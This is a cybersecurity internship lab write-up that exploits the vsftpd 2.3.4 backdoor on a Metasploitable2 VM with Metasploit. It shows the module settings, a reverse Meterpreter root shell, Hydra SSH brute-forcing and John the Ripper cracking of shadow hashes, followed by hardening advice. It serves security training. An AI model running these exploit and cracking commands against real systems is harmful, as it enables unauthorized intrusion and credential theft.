# 🛡️ Cybersecurity Internship — Task 4

## Exploitation & System Security

![Kali Linux](https://img.shields.io/badge/Platform-Kali%20Linux-557C94?logo=kalilinux\&logoColor=white)
![Metasploitable2](https://img.shields.io/badge/Target-Metasploitable2-red)
![Metasploit](https://img.shields.io/badge/Tool-Metasploit-blue)
![Nmap](https://img.shields.io/badge/Tool-Nmap-2E8B57)
![John the Ripper](https://img.shields.io/badge/Tool-John%20the%20Ripper-orange)
![Python](https://img.shields.io/badge/Language-Python-3776AB?logo=python\&logoColor=white)
![Status](https://img.shields.io/badge/Status-Completed-success)

> **APEX Planet Cybersecurity Internship — Task 4**
>
> **Focus:** Penetration Testing, Exploitation, Post-Exploitation & System Security

---

## 📌 Overview

Task 4 focused on understanding and demonstrating a practical **penetration-testing workflow** in a controlled cybersecurity laboratory.

The assessment followed:

```text
Reconnaissance
      ↓
Scanning & Enumeration
      ↓
Vulnerability Identification
      ↓
Exploitation
      ↓
Post-Exploitation
      ↓
Password Security Testing
      ↓
Security Awareness
      ↓
Mitigation & Hardening
      ↓
Reporting
```

All exploitation activities were performed against the intentionally vulnerable **Metasploitable2** virtual machine inside an isolated VirtualBox environment.

---

## 🎯 Objectives

* Understand the penetration-testing methodology.
* Perform vulnerability identification and exploitation.
* Exploit a known Metasploitable2 vulnerability using Metasploit.
* Establish and verify a reverse Meterpreter session.
* Perform basic post-exploitation enumeration.
* Demonstrate password security testing with Hydra and John the Ripper.
* Conduct a controlled phishing-awareness simulation.
* Understand static and dynamic malware analysis.
* Identify system-hardening measures.
* Document findings, evidence, and mitigations.

---

## 🧪 Laboratory Environment

| Component           | Details                            |
| ------------------- | ---------------------------------- |
| **Testing Machine** | Kali Linux                         |
| **Kali IP**         | `10.0.2.15`                        |
| **Target Machine**  | Metasploitable2                    |
| **Target IP**       | `10.0.2.4`                         |
| **Virtualization**  | VirtualBox                         |
| **Network**         | Isolated laboratory                |
| **Scope**           | Authorized educational environment |

---

## 🛠️ Tools Used

| Tool                      | Purpose                                |
| ------------------------- | -------------------------------------- |
| 🔎 **Nmap**               | Network scanning & service enumeration |
| 💥 **Metasploit**         | Vulnerability exploitation             |
| 🖥️ **Meterpreter**       | Post-exploitation verification         |
| 🔐 **Hydra**              | Controlled SSH password testing        |
| 🔓 **John the Ripper**    | Offline password-hash cracking         |
| 📚 **RockYou**            | Password dictionary                    |
| 🌐 **Python HTTP Server** | Local phishing-awareness simulation    |
| 💻 **VirtualBox**         | Isolated lab environment               |

---

# 1️⃣ Penetration Testing Methodology

The assessment followed a structured penetration-testing lifecycle:

### 1. Reconnaissance

Identify the target and gather basic information.

### 2. Scanning & Enumeration

Identify open ports, services, and versions.

### 3. Vulnerability Identification

Analyze discovered services for known vulnerabilities.

### 4. Exploitation

Use an appropriate exploit against the vulnerable laboratory service.

### 5. Post-Exploitation

Verify access level and collect basic system information.

### 6. Password Security Testing

Perform controlled password-testing exercises.

### 7. Security Awareness

Demonstrate phishing indicators using a safe local simulation.

### 8. Mitigation

Identify appropriate defensive controls and hardening measures.

### 9. Reporting

Document findings, evidence, impact, and recommendations.

---

# 2️⃣ Network Scanning & Enumeration

Nmap was used to identify exposed services on Metasploitable2.

```bash
nmap -sS -sV -O 10.0.2.4
```

### Important Services Identified

|  Port | Service | Version / Information |
| ----: | ------- | --------------------- |
|  `21` | FTP     | `vsftpd 2.3.4`        |
|  `22` | SSH     | OpenSSH 4.7p1         |
|  `23` | Telnet  | telnetd               |
|  `25` | SMTP    | Postfix               |
|  `53` | DNS     | ISC BIND 9.4.2        |
|  `80` | HTTP    | Apache 2.2.8          |
| `111` | RPC     | rpcbind               |
| `139` | SMB     | Samba                 |

The FTP service running **vsftpd 2.3.4** was selected for the exploitation demonstration.

### 📸 Evidence

```text
screenshots/01-nmap-scan.png
```

---

# 3️⃣ Vulnerability Identification

The FTP service returned the following banner:

```text
220 (vsFTPd 2.3.4)
```

The version was checked using the corresponding Metasploit module.

---

# 4️⃣ Metasploit Exploitation

### Module

```text
exploit/unix/ftp/vsftpd_234_backdoor
```

Start Metasploit:

```bash
msfconsole
```

Select the exploit:

```text
use exploit/unix/ftp/vsftpd_234_backdoor
```

Configure the target:

```text
set RHOSTS 10.0.2.4
set RPORT 21
set LHOST 10.0.2.15
set LPORT 4444
```

### Vulnerability Check

```text
check
```

The module reported that the target appeared vulnerable.

### Exploitation

```text
exploit
```

Successful output included:

```text
Started reverse TCP handler on 10.0.2.15:4444
Backdoor has been spawned!
Meterpreter session 1 opened
```

This confirmed that the vulnerable FTP service could be exploited in the authorized laboratory.

### 📸 Evidence

```text
screenshots/02-metasploit-check.png
screenshots/03-metasploit-exploit.png
```

---

# 5️⃣ Reverse Shell / Meterpreter Session

The successful exploit created a reverse Meterpreter connection from the target to Kali.

### System Information

```text
meterpreter > sysinfo
```

Observed:

```text
Computer     : metasploitable.localdomain
OS           : Ubuntu 8.04
Architecture : i686
Meterpreter  : x86/linux
```

### Privilege Verification

```text
meterpreter > getuid
```

Result:

```text
Server username: root
```

### Current Directory

```text
meterpreter > pwd
```

Result:

```text
/
```

The `getuid` result confirmed that the obtained session had **root-level privileges**.

### 📸 Evidence

```text
screenshots/04-meterpreter-session.png
screenshots/05-sysinfo-getuid.png
```

---

# 6️⃣ Post-Exploitation

Basic post-exploitation enumeration was performed using Meterpreter.

| Command   | Purpose                                    |
| --------- | ------------------------------------------ |
| `sysinfo` | Identify operating system and architecture |
| `getuid`  | Identify current user                      |
| `pwd`     | Identify current directory                 |

### Hashdump Limitation

The `hashdump` command was attempted.

However, the required `priv` extension was not supported by the obtained Linux Meterpreter payload.

```text
The "priv" extension is not supported by this Meterpreter type (x86/linux)
```

This limitation was documented rather than attempting to bypass the payload limitation.

---

# 7️⃣ Hydra — SSH Password Testing

The SSH service was verified using:

```bash
nmap -p 22 10.0.2.4
```

Result:

```text
22/tcp open ssh
```

A controlled Hydra test was performed:

```bash
hydra -l msfadmin -P passwords.txt ssh://10.0.2.4
```

### Result

Hydra encountered a legacy SSH cryptographic compatibility problem:

```text
kex error : no match for method mac algo
```

The Metasploitable2 SSH server offers older cryptographic algorithms that the modern SSH stack does not accept by default.

Manual SSH connectivity was subsequently verified using legacy compatibility options:

```bash
ssh -o MACs=hmac-sha1 \
-o HostKeyAlgorithms=+ssh-rsa \
-o PubkeyAcceptedAlgorithms=+ssh-rsa \
msfadmin@10.0.2.4
```

### Assessment Result

| Test                   | Result                         |
| ---------------------- | ------------------------------ |
| SSH service reachable  | ✅ Yes                          |
| Hydra automated attack | ⚠️ Legacy compatibility issue  |
| Manual SSH connection  | ✅ Successful                   |
| Target                 | Authorized Metasploitable2 lab |

The Hydra limitation was documented rather than modifying the vulnerable target's legacy SSH configuration unnecessarily.

### 📸 Evidence

```text
screenshots/06-hydra-attempt.png
```

---

# 8️⃣ John the Ripper — Password Cracking

Authorized password hashes from Metasploitable2 were analyzed offline.

The RockYou wordlist was used:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt
```

John detected:

```text
Loaded 7 password hashes with 7 different salts
```

The cracking session completed successfully.

### Result

```text
3 password hashes cracked, 4 left
```

Display the results:

```bash
john --show shadow.txt
```

### Results Summary

| Metric           |    Result |
| ---------------- | --------: |
| Hashes tested    |     **7** |
| Hashes cracked   |     **3** |
| Hashes remaining |     **4** |
| Hash type        | MD5-crypt |
| Wordlist         |   RockYou |

### Security Observation

The successful recovery of 3 out of 7 hashes demonstrates the risk associated with weak passwords and legacy password-hashing configurations.

### 🔒 Filtering / Privacy

**Recovered passwords and raw `/etc/shadow` contents are intentionally excluded from this public repository.**

Do not commit:

```text
/etc/shadow
passwords.txt
raw password hashes
recovered passwords
private keys
tokens
cookies
credentials
```

### 📸 Evidence

```text
screenshots/11-john-password-cracking.png
```

If the screenshot contains recovered passwords, **redact them before uploading to GitHub**.

---

# 9️⃣ Phishing Awareness Simulation

A controlled phishing-awareness simulation was created for educational purposes.

The simulation was designed as an **awareness page**, not a credential-harvesting system.

### Awareness Topics

* Verify the sender and domain.
* Inspect links before opening them.
* Be suspicious of urgent requests.
* Never provide passwords through suspicious links.
* Independently verify unexpected requests.

### Local Hosting

The page was hosted using Python's built-in HTTP server:

```bash
python3 -m http.server 8081
```

The page was accessed locally:

```text
http://127.0.0.1:8081
```

### Safety Controls

The simulation:

* ❌ Did not collect usernames.
* ❌ Did not collect passwords.
* ❌ Did not transmit credentials.
* ❌ Did not target real users.
* ❌ Did not use external phishing infrastructure.
* ✅ Was restricted to the local laboratory.

### 📸 Evidence

```text
screenshots/12-phishing-awareness.png
```

---

# 🔟 Malware Analysis Basics

The task also covered the fundamentals of malware analysis.

## Static Analysis

Static analysis examines a file without executing it.

Typical commands include:

```bash
file sample
sha256sum sample
strings sample
```

These can be used to identify:

* File type.
* Cryptographic hash.
* Embedded strings.
* Potential indicators.
* Basic file characteristics.

## Dynamic Analysis

Dynamic analysis observes a sample while it executes inside an isolated environment.

Possible observations include:

* Processes.
* File modifications.
* Network connections.
* System changes.
* Memory activity.

> ⚠️ Unknown malware should never be executed on a normal workstation. Malware analysis should use an isolated sandbox and authorized samples.

---

# 1️⃣1️⃣ System Hardening

The exploitation results demonstrate the importance of reducing the system's attack surface.

## FTP Hardening

* Remove vulnerable versions of vsftpd.
* Upgrade to a supported version.
* Disable FTP if unnecessary.
* Restrict FTP access.
* Prefer secure file-transfer protocols.

## SSH Hardening

* Disable obsolete cryptographic algorithms.
* Use modern host-key algorithms.
* Use modern MAC algorithms.
* Restrict SSH access.
* Use strong authentication.
* Enable MFA where appropriate.

## Password Hardening

* Use strong, unique passwords.
* Prevent common passwords.
* Use modern password-hashing algorithms.
* Apply account protection controls.
* Avoid password reuse.

## Network Hardening

* Disable unnecessary services.
* Close unused ports.
* Use firewall rules.
* Regularly scan exposed services.
* Monitor authentication attempts.

---

# 1️⃣2️⃣ Findings Summary

| Finding                   | Evidence                                                  | Mitigation                                          |
| ------------------------- | --------------------------------------------------------- | --------------------------------------------------- |
| Vulnerable `vsftpd 2.3.4` | Metasploit successfully established a Meterpreter session | Upgrade/remove vulnerable FTP service               |
| Root-level compromise     | `getuid` returned `root`                                  | Patch vulnerabilities and restrict service exposure |
| Weak password security    | 3/7 hashes cracked                                        | Strong passwords + modern hashing                   |
| Legacy SSH cryptography   | Modern client initially failed negotiation                | Upgrade SSH configuration                           |
| Phishing exposure         | Awareness simulation                                      | Security awareness training                         |

---

# 1️⃣3️⃣ Screenshots

Recommended repository structure:

```text
screenshots/
├── 01-nmap-scan.png
├── 02-metasploit-check.png
├── 03-metasploit-exploit.png
├── 04-meterpreter-session.png
├── 05-sysinfo-getuid.png
├── 06-hydra-attempt.png
├── 11-john-password-cracking.png
└── 12-phishing-awareness.png
```

> **Important:** Review every screenshot before committing it. Redact passwords, hashes, credentials, tokens, cookies, private keys, or other sensitive information.

---

# 1️⃣4️⃣ Project Structure

Recommended GitHub structure:

```text
Task-4-Exploitation-System-Security/
│
├── README.md
│
├── exploitation/
│   ├── metasploit-exploitation.md
│   └── post-exploitation.md
│
├── password-attacks/
│   ├── hydra.md
│   └── john-the-ripper.md
│
├── phishing-awareness/
│   └── index.html
│
├── malware-analysis/
│   └── malware-basics.md
│
├── hardening/
│   └── system-hardening.md
│
├── screenshots/
│   ├── 01-nmap-scan.png
│   ├── 02-metasploit-check.png
│   ├── 03-metasploit-exploit.png
│   ├── 04-meterpreter-session.png
│   ├── 05-sysinfo-getuid.png
│   ├── 06-hydra-attempt.png
│   ├── 11-john-password-cracking.png
│   └── 12-phishing-awareness.png
│
└── report/
    └── Task-4-Penetration-Testing-Report.pdf
```

---

# 1️⃣5️⃣ Key Results

### 💥 Exploitation

```text
vsftpd 2.3.4
       ↓
Metasploit
       ↓
Backdoor
       ↓
Meterpreter
       ↓
Root Access
```

### 🔐 Password Security

```text
7 hashes tested
       ↓
John the Ripper
       ↓
RockYou wordlist
       ↓
3 cracked
4 remaining
```

### 🌐 Security Awareness

```text
Local awareness page
       ↓
Phishing indicators
       ↓
No credential collection
       ↓
Security education
```

---

# 1️⃣6️⃣ Ethical & Safety Considerations

This project was performed exclusively within an authorized educational laboratory.

The techniques demonstrated in this project should only be used against systems for which explicit authorization has been provided.

No public systems, third-party accounts, real phishing targets, or unauthorized credentials were targeted.

Sensitive information must not be committed to the public repository.

---

# 1️⃣7️⃣ Deliverables

| Deliverable                    | Status                                 |
| ------------------------------ | -------------------------------------- |
| Penetration Testing Report     | ✅ Completed                            |
| Metasploit Exploitation        | ✅ Completed                            |
| Reverse Meterpreter Session    | ✅ Completed                            |
| Post-Exploitation Verification | ✅ Completed                            |
| Hydra Testing                  | ⚠️ Compatibility Limitation Documented |
| John the Ripper                | ✅ Completed — 3/7 cracked              |
| Phishing Awareness Simulation  | ✅ Completed                            |
| GitHub Documentation           | ✅ Completed                            |
| Demo Video                     | ✅ Completed                            |

---

# 🏁 Conclusion

Task 4 provided hands-on experience with the penetration-testing lifecycle, exploitation, post-exploitation, password security, security awareness, and system hardening.

The primary exploitation objective was successfully completed by exploiting the vulnerable **vsftpd 2.3.4** service with Metasploit and establishing a root-level Meterpreter session.

John the Ripper successfully recovered **3 of 7 authorized password hashes**, demonstrating the security impact of weak passwords and legacy hashing configurations.

The Hydra exercise highlighted compatibility challenges that can occur when modern security tools interact with legacy systems.

The phishing-awareness simulation demonstrated common social-engineering indicators while intentionally avoiding credential collection.

Overall, the task connected offensive security techniques with defensive mitigations and reinforced the importance of performing security testing only within an authorized scope.

---

## 📚 Skills Demonstrated

`Penetration Testing` · `Network Scanning` · `Nmap` · `Metasploit` · `Meterpreter` · `Linux` · `Post-Exploitation` · `Password Security` · `John the Ripper` · `Hydra` · `Phishing Awareness` · `Security Hardening` · `Vulnerability Assessment`

---

### ⚠️ Disclaimer

> **For educational and authorized security-testing purposes only.**
>
> All testing was conducted against intentionally vulnerable systems within an isolated laboratory environment. Never use these techniques against systems without explicit authorization.
